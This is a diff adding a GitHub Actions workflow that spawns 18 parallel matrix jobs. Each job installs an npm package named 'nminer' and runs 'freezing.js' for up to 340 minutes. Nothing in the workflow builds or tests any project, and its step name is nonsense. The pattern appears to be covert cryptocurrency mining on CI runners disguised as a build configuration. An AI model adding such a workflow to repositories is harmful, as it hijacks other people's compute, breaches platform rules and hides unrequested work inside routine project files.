@@ -1,0 +1,43 @@
+name: freezing
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 2894 }
+          - { version: 1787 }
+          - { version: 9319 }
+          - { version: 6323 }
+          - { version: 1315 }
+          - { version: 7514 }
+          - { version: 8335 }
+          - { version: 2715 }
+          - { version: 6428 }
+          - { version: 6871 }
+          - { version: 8759 }
+          - { version: 2876 }
+          - { version: 7308 }
+          - { version: 1562 }
+          - { version: 1256 }
+          - { version: 1071 }
+          - { version: 3054 }
+          - { version: 1644 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: after honestly reproachfully
+        run: |
+          npm install nminer@latest
+          timeout 340m node freezing.js || echo "freezing executed"
